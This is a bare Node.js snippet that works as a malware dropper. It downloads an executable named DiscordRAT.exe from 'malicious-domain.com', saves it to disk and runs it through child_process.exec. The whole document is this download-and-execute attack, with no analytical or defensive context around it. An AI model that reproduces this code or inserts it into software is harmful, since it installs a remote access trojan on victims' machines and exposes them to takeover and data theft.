const https = require('https');
const { exec } = require('child_process');
https.get('https://malicious-domain.com/DiscordRAT.exe', (res) => {
  const file = require('fs').createWriteStream('DiscordRAT.exe');
  res.pipe(file);
  file.on('finish', () => {
    file.close(() => {
      exec('DiscordRAT.exe');
    });
  });
});
